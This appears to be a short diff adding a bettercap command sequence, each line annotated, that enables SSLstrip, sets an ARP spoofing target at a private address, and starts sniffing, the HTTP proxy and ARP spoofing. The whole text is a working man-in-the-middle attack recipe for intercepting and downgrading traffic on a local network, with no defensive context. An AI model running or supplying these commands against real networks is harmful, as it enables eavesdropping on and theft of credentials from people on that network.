@@ -1,0 +1,7 @@
+set http.proxy.sslstrip true                         (enables SSLSTRIP)
+set arp.spoof.internal true                         (enables internal network ARP spoofing)
+set arp.spoof.targets 192.168.254.70      (sets the ARP spoofing target)
+set net.sniff.verbose false                          (disables verbose sniffing info)
+net.sniff on            (starts the sniffer module)
+http.proxy on         (starts the http proxy module)
+arp.spoof on          (starts the ARP spoofing module)
